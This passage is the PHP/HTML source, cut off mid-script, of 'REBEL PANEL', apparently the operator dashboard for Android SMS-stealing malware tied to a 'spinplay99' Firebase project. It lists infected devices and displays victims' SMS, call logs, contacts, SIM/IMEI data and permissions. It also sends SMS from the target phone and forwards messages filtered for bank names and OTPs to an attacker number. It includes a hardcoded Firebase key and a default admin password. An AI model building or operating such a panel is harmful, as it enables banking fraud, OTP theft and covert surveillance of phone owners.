<?php header('Content-Type: text/html; charset=UTF-8'); ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>REBEL PANEL — CYBER COMMAND</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet"/>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
<style>
:root{
  --bg:#020408;--bg2:#040810;--surface:#060d18;--card:#081420;--border:#0d2840;
  --accent:#00d4ff;--accent2:#ff6b00;--accent3:#00ff88;--accent4:#bd00ff;
  --text:#c8e8ff;--muted:#4a7090;--danger:#ff2244;--warn:#ffaa00;
  --glow1:rgba(0,212,255,0.15);--glow2:rgba(0,255,136,0.1);
}
*{margin:0;padding:0;box-sizing:border-box}
html{scroll-behavior:smooth}
body{font-family:'Rajdhani',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}

/* SCANLINE OVERLAY */
body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,255,0.015) 2px,rgba(0,212,255,0.015) 4px);pointer-events:none;z-index:9998}
/* GRID BG */
body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,212,255,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.04) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}

.wrapper{position:relative;z-index:1}

/* ═══ LOGIN ═══ */
#loginPage{position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;padding:20px}
#loginPage.hidden{display:none!important}
.login-wrap{width:100%;max-width:420px}
.login-box{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:40px 36px;position:relative;overflow:hidden}
.login-box::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--accent),var(--accent4),var(--accent),transparent);animation:scanLine 3s linear infinite}
@keyframes scanLine{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
.login-box::after{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,rgba(0,212,255,0.03) 0%,transparent 60%);pointer-events:none}
.login-logo-text{font-family:'Orbitron',monospace;font-size:22px;font-weight:900;letter-spacing:4px;color:var(--accent);text-shadow:0 0 20px rgba(0,212,255,0.8),0 0 40px rgba(0,212,255,0.4);margin-bottom:4px}
.login-sub{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:3px;margin-bottom:28px}
.login-error{background:rgba(255,34,68,0.1);border:1px solid rgba(255,34,68,0.4);color:var(--danger);border-radius:2px;padding:8px 12px;font-family:'Share Tech Mono',monospace;font-size:10px;margin-bottom:12px;display:none}
.cyber-label{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--accent);letter-spacing:2px;display:block;margin-bottom:5px}
.cyber-input{width:100%;background:rgba(0,212,255,0.04);border:1px solid rgba(0,212,255,0.2);border-radius:2px;padding:11px 14px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:13px;outline:none;transition:all 0.2s;margin-bottom:12px}
.cyber-input:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(0,212,255,0.1),inset 0 0 10px rgba(0,212,255,0.05)}
.remember-row{display:flex;align-items:center;gap:8px;margin-bottom:18px}
.remember-row input[type=checkbox]{width:14px;height:14px;accent-color:var(--accent)}
.remember-row label{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);cursor:pointer}
.cyber-btn{width:100%;padding:13px;border:1px solid var(--accent);background:transparent;color:var(--accent);font-family:'Orbitron',monospace;font-weight:700;font-size:11px;letter-spacing:3px;cursor:pointer;transition:all 0.2s;position:relative;overflow:hidden;text-transform:uppercase}
.cyber-btn::before{content:'';position:absolute;inset:0;background:var(--accent);transform:scaleX(0);transform-origin:left;transition:transform 0.3s;z-index:-1}
.cyber-btn:hover{color:var(--bg);text-shadow:none}
.cyber-btn:hover::before{transform:scaleX(1)}
.login-hint{text-align:center;font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);margin-top:14px;letter-spacing:1px}

/* ═══ HEADER ═══ */
header{padding:14px 28px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;background:rgba(4,8,16,0.95);backdrop-filter:blur(20px);position:sticky;top:0;z-index:100}
.logo-area{display:flex;align-items:center;gap:14px}
.logo-hex{width:40px;height:40px;position:relative;flex-shrink:0}
.logo-hex svg{width:100%;height:100%;filter:drop-shadow(0 0 8px rgba(0,212,255,0.7))}
.logo-hex-text{font-family:'Orbitron',monospace;font-size:18px;font-weight:900;letter-spacing:3px;color:var(--accent);text-shadow:0 0 15px rgba(0,212,255,0.6)}
.logo-hex-sub{font-family:'Share Tech Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:3px}
.header-right{display:flex;align-items:center;gap:12px}
.conn-pill{display:flex;align-items:center;gap:7px;padding:5px 14px;border-radius:2px;border:1px solid var(--border);font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);transition:all 0.3s}
.conn-pill.live{border-color:var(--accent3);color:var(--accent3)}
.conn-dot{width:6px;height:6px;border-radius:50%;background:var(--muted)}
.conn-pill.live .conn-dot{background:var(--accent3);box-shadow:0 0 8px var(--accent3);animation:pulse 1.5s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.8)}}
.logout-btn{padding:5px 12px;border:1px solid rgba(255,34,68,0.3);background:transparent;color:var(--danger);font-family:'Share Tech Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.2s;letter-spacing:1px}
.logout-btn:hover{background:rgba(255,34,68,0.1)}

/* ═══ MAIN LAYOUT ═══ */
.main-layout{display:flex;min-height:calc(100vh - 65px)}

/* ═══ DEVICE SIDEBAR ═══ */
.device-sidebar{width:280px;flex-shrink:0;border-right:1px solid var(--border);background:rgba(4,8,16,0.8);height:calc(100vh - 65px);position:sticky;top:65px;overflow-y:auto;display:flex;flex-direction:column}
.device-sidebar::-webkit-scrollbar{width:3px}
.device-sidebar::-webkit-scrollbar-track{background:transparent}
.device-sidebar::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
.sidebar-header{padding:16px 16px 12px;border-bottom:1px solid var(--border)}
.sidebar-title{font-family:'Orbitron',monospace;font-size:10px;font-weight:700;color:var(--accent);letter-spacing:3px;margin-bottom:8px}
.sidebar-stats{display:flex;gap:8px}
.mini-stat{flex:1;background:var(--surface);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center}
.mini-stat-val{font-family:'Orbitron',monospace;font-size:16px;font-weight:700;line-height:1}
.mini-stat-val.online{color:var(--accent3)}
.mini-stat-val.offline{color:var(--muted)}
.mini-stat-val.total{color:var(--accent)}
.mini-stat-lbl{font-family:'Share Tech Mono',monospace;font-size:7px;color:var(--muted);letter-spacing:1px;margin-top:3px}
.sidebar-search{padding:10px 12px;border-bottom:1px solid var(--border)}
.sidebar-search input{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:2px;padding:7px 10px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:10px;outline:none}
.sidebar-search input:focus{border-color:var(--accent)}
.device-list{flex:1;padding:8px}
.dev-item{padding:12px;border:1px solid var(--border);border-radius:3px;margin-bottom:6px;cursor:pointer;transition:all 0.2s;position:relative;overflow:hidden;background:var(--surface)}
.dev-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:var(--muted);transition:all 0.2s}
.dev-item:hover{border-color:rgba(0,212,255,0.3);background:rgba(0,212,255,0.03)}
.dev-item:hover::before{background:var(--accent)}
.dev-item.active{border-color:var(--accent);background:rgba(0,212,255,0.06)}
.dev-item.active::before{background:var(--accent);box-shadow:0 0 8px var(--accent)}
.dev-item.online::before{background:var(--accent3)}
.dev-item.online.active::before{background:var(--accent3);box-shadow:0 0 8px var(--accent3)}
.dev-item-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
.dev-item-name{font-family:'Rajdhani',sans-serif;font-weight:700;font-size:13px;color:var(--text)}
.dev-status-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
.dev-status-dot.online{background:var(--accent3);box-shadow:0 0 6px var(--accent3);animation:pulse 2s infinite}
.dev-status-dot.offline{background:var(--muted)}
.dev-item-id{font-family:'Share Tech Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:6px;letter-spacing:1px}
.dev-item-meta{display:flex;gap:8px;flex-wrap:wrap}
.dev-meta-chip{font-family:'Share Tech Mono',monospace;font-size:8px;color:var(--muted);background:var(--bg2);padding:2px 6px;border-radius:2px;border:1px solid var(--border)}
.dev-meta-chip.bat-high{color:var(--accent3);border-color:rgba(0,255,136,0.2)}
.dev-meta-chip.bat-med{color:var(--warn);border-color:rgba(255,170,0,0.2)}
.dev-meta-chip.bat-low{color:var(--danger);border-color:rgba(255,34,68,0.2)}
.dev-no-data{text-align:center;padding:30px 16px;color:var(--muted);font-family:'Share Tech Mono',monospace;font-size:10px}

/* ═══ MAIN CONTENT ═══ */
.main-content{flex:1;overflow-x:hidden}

/* ═══ EMPTY STATE ═══ */
.empty-state{display:flex;flex-direction:column;align-items:center;justify-content:center;height:60vh;gap:16px;opacity:0.4}
.empty-state-icon{font-size:48px}
.empty-state-text{font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--muted);letter-spacing:2px}

/* ═══ DEVICE DETAIL ═══ */
.device-detail{padding:0}

/* DEVICE HERO */
.dev-hero{padding:20px 28px;border-bottom:1px solid var(--border);background:linear-gradient(135deg,rgba(0,212,255,0.04) 0%,transparent 70%);position:relative;overflow:hidden}
.dev-hero::after{content:'';position:absolute;top:-50%;right:-10%;width:200px;height:200px;border-radius:50%;background:radial-gradient(circle,rgba(0,212,255,0.06) 0%,transparent 70%);pointer-events:none}
.dev-hero-top{display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:16px}
.dev-hero-name{font-family:'Orbitron',monospace;font-size:20px;font-weight:700;color:var(--text);letter-spacing:2px}
.dev-hero-brand{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;margin-top:3px}
.dev-hero-id{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--accent);letter-spacing:1px;margin-top:4px}
.status-tag{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;border-radius:2px;font-family:'Orbitron',monospace;font-size:9px;font-weight:700;letter-spacing:2px}
.status-tag.online{background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.3);color:var(--accent3)}
.status-tag.offline{background:rgba(74,112,144,0.1);border:1px solid rgba(74,112,144,0.3);color:var(--muted)}
.dev-hero-metrics{display:flex;gap:16px;flex-wrap:wrap}
.hero-metric{display:flex;flex-direction:column;gap:3px}
.hero-metric-label{font-family:'Share Tech Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px}
.hero-metric-val{font-family:'Orbitron',monospace;font-size:13px;font-weight:700;color:var(--accent)}
.hero-metric-val.green{color:var(--accent3)}
.hero-metric-val.orange{color:var(--accent2)}

/* DATA TABS */
.data-tabs{display:flex;gap:0;padding:0 28px;border-bottom:1px solid var(--border);overflow-x:auto;background:rgba(4,8,16,0.6)}
.data-tab{padding:12px 16px;border:none;background:transparent;font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);cursor:pointer;letter-spacing:1.5px;text-transform:uppercase;border-bottom:2px solid transparent;transition:all 0.2s;margin-bottom:-1px;white-space:nowrap;display:flex;align-items:center;gap:6px;flex-shrink:0}
.data-tab:hover{color:var(--text)}
.data-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
.tab-count{background:rgba(0,212,255,0.12);border:1px solid rgba(0,212,255,0.25);color:var(--accent);padding:1px 6px;border-radius:2px;font-size:8px}

/* DATA SECTIONS */
.data-section{padding:20px 28px 40px;display:none}
.data-section.active{display:block}

/* CYBER TABLE */
.cyber-table-wrap{border:1px solid var(--border);border-radius:3px;overflow:hidden;overflow-x:auto;margin-top:12px}
.cyber-table{width:100%;border-collapse:collapse;min-width:500px}
.cyber-table thead tr{background:rgba(0,212,255,0.05);border-bottom:1px solid var(--border)}
.cyber-table th{padding:10px 14px;font-family:'Share Tech Mono',monospace;font-size:8px;color:var(--accent);letter-spacing:2px;text-align:left;white-space:nowrap;text-transform:uppercase}
.cyber-table tbody tr{border-bottom:1px solid rgba(13,40,64,0.5);transition:background 0.1s;cursor:default}
.cyber-table tbody tr:last-child{border-bottom:none}
.cyber-table tbody tr:hover{background:rgba(0,212,255,0.02)}
.cyber-table td{padding:10px 14px;font-size:12px;vertical-align:middle}
.mono{font-family:'Share Tech Mono',monospace;font-size:10px}
.type-badge{display:inline-block;padding:2px 8px;border-radius:2px;font-family:'Share Tech Mono',monospace;font-size:8px;font-weight:700;letter-spacing:1px}
.badge-inbox{background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.25);color:var(--accent3)}
.badge-sent{background:rgba(255,107,0,0.1);border:1px solid rgba(255,107,0,0.25);color:var(--accent2)}
.badge-incoming{background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.25);color:var(--accent3)}
.badge-outgoing{background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.25);color:var(--accent)}
.badge-missed{background:rgba(255,34,68,0.1);border:1px solid rgba(255,34,68,0.25);color:var(--danger)}
.badge-granted{background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.25);color:var(--accent3)}
.badge-denied{background:rgba(255,34,68,0.1);border:1px solid rgba(255,34,68,0.25);color:var(--danger)}
.table-empty{text-align:center;padding:40px;color:var(--muted);font-family:'Share Tech Mono',monospace;font-size:10px}

/* SECTION HEADER */
.section-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;flex-wrap:wrap;gap:8px}
.section-title{font-family:'Orbitron',monospace;font-size:12px;font-weight:700;color:var(--accent);letter-spacing:3px}
.section-sub{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:1px}

/* SEARCH BAR */
.cyber-search{background:var(--surface);border:1px solid var(--border);border-radius:2px;padding:8px 12px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:10px;outline:none;width:100%;max-width:260px;transition:all 0.2s}
.cyber-search:focus{border-color:var(--accent)}

/* SIM CARDS */
.sim-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:12px;margin-top:12px}
.sim-card{background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:16px;position:relative;overflow:hidden}
.sim-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent4),transparent)}
.sim-field{display:flex;justify-content:space-between;align-items:flex-start;padding:7px 0;border-bottom:1px solid rgba(13,40,64,0.6)}
.sim-field:last-child{border-bottom:none}
.sim-key{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--accent2);letter-spacing:1px}
.sim-val{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text);text-align:right;word-break:break-all;max-width:55%;line-height:1.4}

/* SEND SMS */
.cyber-form{background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:22px;position:relative;overflow:hidden;max-width:520px;margin-top:12px}
.cyber-form::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),var(--accent4),transparent)}
.cyber-form-field{margin-bottom:14px}
.cyber-form-field label{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--accent);letter-spacing:2px;display:block;margin-bottom:5px;text-transform:uppercase}
.cyber-form-field input,.cyber-form-field textarea{width:100%;background:rgba(0,212,255,0.03);border:1px solid rgba(0,212,255,0.15);border-radius:2px;padding:10px 12px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:12px;outline:none;transition:all 0.2s}
.cyber-form-field input:focus,.cyber-form-field textarea:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(0,212,255,0.08)}
.cyber-form-field textarea{resize:vertical;min-height:80px}
.cyber-submit{padding:11px 28px;border:1px solid var(--accent3);background:transparent;color:var(--accent3);font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:2px;cursor:pointer;transition:all 0.2s;text-transform:uppercase}
.cyber-submit:hover{background:rgba(0,255,136,0.1)}
.send-status{margin-top:10px;font-family:'Share Tech Mono',monospace;font-size:10px}

/* FORWARDING */
.fw-toggle-row{display:flex;align-items:center;gap:12px;margin-bottom:16px}
.fw-toggle-row label{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text);letter-spacing:1px}
.toggle-switch{position:relative;width:44px;height:22px;flex-shrink:0}
.toggle-switch input{opacity:0;width:0;height:0}
.toggle-slider{position:absolute;inset:0;background:var(--border);border-radius:11px;cursor:pointer;transition:all 0.3s}
.toggle-slider::before{content:'';position:absolute;width:16px;height:16px;border-radius:50%;left:3px;top:3px;background:var(--muted);transition:all 0.3s}
input:checked + .toggle-slider{background:rgba(0,255,136,0.2);border:1px solid var(--accent3)}
input:checked + .toggle-slider::before{transform:translateX(22px);background:var(--accent3)}

/* PERMS GRID */
.perm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;margin-top:12px}
.perm-item{background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:12px 14px;display:flex;align-items:center;justify-content:space-between;gap:8px}
.perm-name{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--text);letter-spacing:1px;text-transform:uppercase}
.perm-granted{color:var(--accent3);font-family:'Share Tech Mono',monospace;font-size:9px}
.perm-denied{color:var(--danger);font-family:'Share Tech Mono',monospace;font-size:9px}

/* TOAST */
.toast-wrap{position:fixed;bottom:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none}
.toast{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:10px 16px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text);display:flex;align-items:center;gap:10px;animation:toastIn 0.2s ease;box-shadow:0 4px 20px rgba(0,0,0,0.5);pointer-events:all}
.toast.ok{border-color:rgba(0,255,136,0.4);color:var(--accent3)}
.toast.err{border-color:rgba(255,34,68,0.4);color:var(--danger)}
@keyframes toastIn{from{opacity:0;transform:translateX(16px)}to{opacity:1;transform:translateX(0)}}
.toast.out{animation:toastOut 0.2s ease forwards}
@keyframes toastOut{to{opacity:0;transform:translateX(16px)}}

/* FOOTER */
footer{border-top:1px solid var(--border);padding:12px 28px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;background:rgba(4,8,16,0.8)}
.footer-txt{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:1px}
.footer-txt span{color:var(--accent)}

@media(max-width:768px){
  .device-sidebar{width:100%;height:auto;position:relative;top:0;border-right:none;border-bottom:1px solid var(--border)}
  .main-layout{flex-direction:column}
  .dev-hero{padding:14px 16px}
  .data-section{padding:14px 16px 30px}
  .data-tabs{padding:0 12px}
}
</style>
</head>
<body>

<!-- LOGIN -->
<div id="loginPage">
  <div class="login-wrap">
    <div class="login-box">
      <div class="login-logo-text">REBEL PANEL</div>
      <div class="login-sub">// CYBER COMMAND CENTER v2.0 //</div>
      <div id="loginErr" class="login-error">// ACCESS DENIED — invalid credentials //</div>
      <div class="cyber-form-field">
        <label class="cyber-label">// OPERATOR_ID</label>
        <input class="cyber-input" type="text" id="loginUser" placeholder="admin" autocomplete="username"/>
      </div>
      <div class="cyber-form-field">
        <label class="cyber-label">// AUTH_KEY</label>
        <input class="cyber-input" type="password" id="loginPass" placeholder="••••••••" autocomplete="current-password"/>
      </div>
      <div class="remember-row">
        <input type="checkbox" id="rememberMe"/>
        <label for="rememberMe">// PERSIST_SESSION</label>
      </div>
      <button class="cyber-btn" onclick="doLogin()">[ AUTHENTICATE ]</button>
      <div class="login-hint">// DEFAULT: admin / rebel2024</div>
    </div>
  </div>
</div>

<div class="wrapper">
<!-- HEADER -->
<header>
  <div class="logo-area">
    <div class="logo-hex">
      <svg viewBox="0 0 44 44" fill="none">
        <polygon points="22,2 40,11 40,33 22,42 4,33 4,11" fill="rgba(0,212,255,0.08)" stroke="#00d4ff" stroke-width="1.2"/>
        <polygon points="22,8 35,14.5 35,29.5 22,36 9,29.5 9,14.5" fill="rgba(0,212,255,0.04)" stroke="rgba(0,212,255,0.4)" stroke-width="0.8"/>
        <text x="22" y="28" text-anchor="middle" font-family="Orbitron,sans-serif" font-weight="900" font-size="13" fill="#00d4ff">R</text>
      </svg>
    </div>
    <div>
      <div class="logo-hex-text">REBEL</div>
      <div class="logo-hex-sub">// COMMAND CENTER</div>
    </div>
  </div>
  <div class="header-right">
    <div id="connPill" class="conn-pill"><div class="conn-dot"></div><span id="connTxt">CONNECTING...</span></div>
    <button class="logout-btn" onclick="doLogout()">// EXIT</button>
  </div>
</header>

<div class="main-layout">

<!-- DEVICE SIDEBAR -->
<div class="device-sidebar" id="sidebar">
  <div class="sidebar-header">
    <div class="sidebar-title">// ACTIVE_NODES</div>
    <div class="sidebar-stats">
      <div class="mini-stat"><div class="mini-stat-val total" id="stTotal">0</div><div class="mini-stat-lbl">TOTAL</div></div>
      <div class="mini-stat"><div class="mini-stat-val online" id="stOnline">0</div><div class="mini-stat-lbl">ONLINE</div></div>
      <div class="mini-stat"><div class="mini-stat-val offline" id="stOffline">0</div><div class="mini-stat-lbl">OFFLINE</div></div>
    </div>
  </div>
  <div class="sidebar-search">
    <input placeholder="// SEARCH NODES..." id="devSearch" oninput="renderSidebar()" autocomplete="off"/>
  </div>
  <div class="device-list" id="devList">
    <div class="dev-no-data">// NO DEVICES CONNECTED</div>
  </div>
</div>

<!-- MAIN CONTENT -->
<div class="main-content" id="mainContent">
  <div class="empty-state" id="emptyState">
    <div class="empty-state-icon">◉</div>
    <div class="empty-state-text">// SELECT A NODE TO INSPECT //</div>
  </div>

  <div class="device-detail hidden" id="deviceDetail">
    <!-- HERO -->
    <div class="dev-hero">
      <div class="dev-hero-top">
        <div>
          <div class="dev-hero-name" id="dName">—</div>
          <div class="dev-hero-brand" id="dBrand">—</div>
          <div class="dev-hero-id" id="dId">—</div>
        </div>
        <div id="dStatusTag" class="status-tag offline">OFFLINE</div>
      </div>
      <div class="dev-hero-metrics">
        <div class="hero-metric"><div class="hero-metric-label">BATTERY</div><div class="hero-metric-val" id="dBat">—</div></div>
        <div class="hero-metric"><div class="hero-metric-label">NETWORK</div><div class="hero-metric-val green" id="dNet">—</div></div>
        <div class="hero-metric"><div class="hero-metric-label">ANDROID</div><div class="hero-metric-val" id="dAndroid">—</div></div>
        <div class="hero-metric"><div class="hero-metric-label">SMS COUNT</div><div class="hero-metric-val orange" id="dSmsCount">—</div></div>
        <div class="hero-metric"><div class="hero-metric-label">LAST SEEN</div><div class="hero-metric-val" id="dLastSeen">—</div></div>
      </div>
    </div>

    <!-- DATA TABS -->
    <div class="data-tabs">
      <button class="data-tab active" onclick="switchDataTab('sms',this)">📩 SMS <span class="tab-count" id="tc-sms">0</span></button>
      <button class="data-tab" onclick="switchDataTab('calls',this)">📞 CALLS <span class="tab-count" id="tc-calls">0</span></button>
      <button class="data-tab" onclick="switchDataTab('contacts',this)">👤 CONTACTS <span class="tab-count" id="tc-contacts">0</span></button>
      <button class="data-tab" onclick="switchDataTab('sim',this)">📶 SIM/IMEI</button>
      <button class="data-tab" onclick="switchDataTab('perms',this)">🔐 PERMS</button>
      <button class="data-tab" onclick="switchDataTab('send',this)">📤 SEND SMS</button>
      <button class="data-tab" onclick="switchDataTab('forward',this)">↗ FORWARD</button>
    </div>

    <!-- SMS -->
    <div class="data-section active" id="tab-sms">
      <div class="section-hdr">
        <div><div class="section-title">// SMS_INBOX</div><div class="section-sub">All messages from device</div></div>
        <input class="cyber-search" placeholder="// FILTER MESSAGES..." oninput="filterRows('smsTbody',this.value)"/>
      </div>
      <div class="cyber-table-wrap">
        <table class="cyber-table"><thead><tr><th>#</th><th>FROM</th><th>MESSAGE</th><th>DATE</th><th>TYPE</th></tr></thead>
        <tbody id="smsTbody"><tr><td colspan="5" class="table-empty">// NO DATA</td></tr></tbody></table>
      </div>
    </div>

    <!-- CALLS -->
    <div class="data-section" id="tab-calls">
      <div class="section-hdr">
        <div><div class="section-title">// CALL_LOG</div><div class="section-sub">Complete call history</div></div>
        <input class="cyber-search" placeholder="// FILTER CALLS..." oninput="filterRows('callsTbody',this.value)"/>
      </div>
      <div class="cyber-table-wrap">
        <table class="cyber-table"><thead><tr><th>#</th><th>NUMBER</th><th>CONTACT</th><th>DATE</th><th>DURATION</th><th>TYPE</th></tr></thead>
        <tbody id="callsTbody"><tr><td colspan="6" class="table-empty">// NO DATA</td></tr></tbody></table>
      </div>
    </div>

    <!-- CONTACTS -->
    <div class="data-section" id="tab-contacts">
      <div class="section-hdr">
        <div><div class="section-title">// CONTACTS_DB</div><div class="section-sub">All saved contacts</div></div>
        <input class="cyber-search" placeholder="// FILTER CONTACTS..." oninput="filterRows('contactsTbody',this.value)"/>
      </div>
      <div class="cyber-table-wrap">
        <table class="cyber-table"><thead><tr><th>#</th><th>NAME</th><th>PHONE</th></tr></thead>
        <tbody id="contactsTbody"><tr><td colspan="3" class="table-empty">// NO DATA</td></tr></tbody></table>
      </div>
    </div>

    <!-- SIM/IMEI -->
    <div class="data-section" id="tab-sim">
      <div class="section-title" style="margin-bottom:8px">// SIM_INTELLIGENCE</div>
      <div class="sim-grid" id="simGrid"><div style="color:var(--muted);font-family:'Share Tech Mono',monospace;font-size:10px">// LOADING...</div></div>
    </div>

    <!-- PERMS -->
    <div class="data-section" id="tab-perms">
      <div class="section-title" style="margin-bottom:8px">// PERMISSION_STATUS</div>
      <div class="perm-grid" id="permGrid"></div>
    </div>

    <!-- SEND SMS -->
    <div class="data-section" id="tab-send">
      <div class="section-title" style="margin-bottom:4px">// SEND_COMMAND</div>
      <div class="section-sub" style="margin-bottom:0">Inject SMS via target device</div>
      <div class="cyber-form">
        <div class="cyber-form-field"><label>TARGET_NUMBER</label><input type="tel" id="sendTo" placeholder="+919876543210"/></div>
        <div class="cyber-form-field"><label>MESSAGE_PAYLOAD</label><textarea id="sendMsg" placeholder="// Enter message..."></textarea></div>
        <button class="cyber-submit" onclick="sendSms()">[ INJECT SMS ]</button>
        <div class="send-status" id="sendStatus"></div>
      </div>
      <div style="margin-top:24px"><div class="section-title" style="margin-bottom:8px">// SENT_LOG</div>
      <div class="cyber-table-wrap"><table class="cyber-table"><thead><tr><th>TO</th><th>MESSAGE</th><th>STATUS</th><th>TIME</th></tr></thead>
      <tbody id="sentTbody"></tbody></table></div></div>
    </div>

    <!-- FORWARD -->
    <div class="data-section" id="tab-forward">
      <div class="section-title" style="margin-bottom:8px">// SMS_FORWARD_CONFIG</div>
      <div class="cyber-form">
        <div class="fw-toggle-row">
          <label class="toggle-switch"><input type="checkbox" id="fwEnabled" onchange="toggleFw()"/><span class="toggle-slider"></span></label>
          <label>FORWARDING_ACTIVE</label>
        </div>
        <div class="cyber-form-field"><label>FORWARD_TO</label><input type="tel" id="fwTo" placeholder="+919876543210"/></div>
        <div class="fw-toggle-row" style="margin-bottom:12px">
          <label class="toggle-switch"><input type="checkbox" id="fwAll" checked onchange="document.getElementById('fwFilterWrap').style.display=this.checked?'none':'block'"/><span class="toggle-slider"></span></label>
          <label>FORWARD_ALL_SMS</label>
        </div>
        <div id="fwFilterWrap" style="display:none" class="cyber-form-field"><label>FILTER_NUMBERS (comma separated)</label><input type="text" id="fwFilters" placeholder="+9198..., HDFC, OTP"/></div>
        <button class="cyber-submit" onclick="saveFw()">[ SAVE CONFIG ]</button>
      </div>
      <div style="margin-top:24px"><div class="section-title" style="margin-bottom:8px">// FORWARD_LOG</div>
      <div class="cyber-table-wrap"><table class="cyber-table"><thead><tr><th>FROM</th><th>TO</th><th>MESSAGE</th><th>TIME</th></tr></thead>
      <tbody id="fwTbody"></tbody></table></div></div>
    </div>
  </div><!-- /device-detail -->
</div><!-- /main-content -->
</div><!-- /main-layout -->

<footer>
  <div class="footer-txt">// <span>REBEL PANEL</span> — SPINPLAY99 COMMAND CENTER</div>
  <div class="footer-txt" id="footerClock"></div>
</footer>
</div><!-- /wrapper -->

<div class="toast-wrap" id="toastWrap"></div>

<script>
var DB, allDevs=[], selDev='', activeListeners={};

// ═══ FIREBASE ═══
(function(){
  firebase.initializeApp({
    apiKey:"AIzaSyCsTa5oZOZ3XS7ZujbAl8JX1qPuUEP6P3I",
    authDomain:"spinplay99.firebaseapp.com",
    databaseURL:"https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId:"spinplay99",
    storageBucket:"spinplay99.firebasestorage.app",
    messagingSenderId:"8121733414",
    appId:"1:8121733414:web:04b9ae5df1b6bc413e31e7"
  });
  DB = firebase.database();
  setConn('live','// FIREBASE CONNECTED');
  startDeviceListener();
})();

function setConn(s,t){var p=document.getElementById('connPill');p.className='conn-pill'+(s==='live'?' live':'');document.getElementById('connTxt').textContent=t;}

// ═══ DEVICE LISTENER ═══
function startDeviceListener(){
  DB.ref('devices').on('value',function(snap){
    var raw=snap.val(); allDevs=[];
    if(!raw){renderSidebar();updateStats();return;}
    var now=Date.now();
    Object.keys(raw).forEach(function(k){
      var d=raw[k],info=d.device_info||{},live=d.live_data||{};
      var on=(d.online_status===true)||(now-(live.timestamp_millis||0)<45000);
      allDevs.push({id:k,name:info.device_model||'UNKNOWN',brand:info.device_brand||'',android:info.android_version||'?',
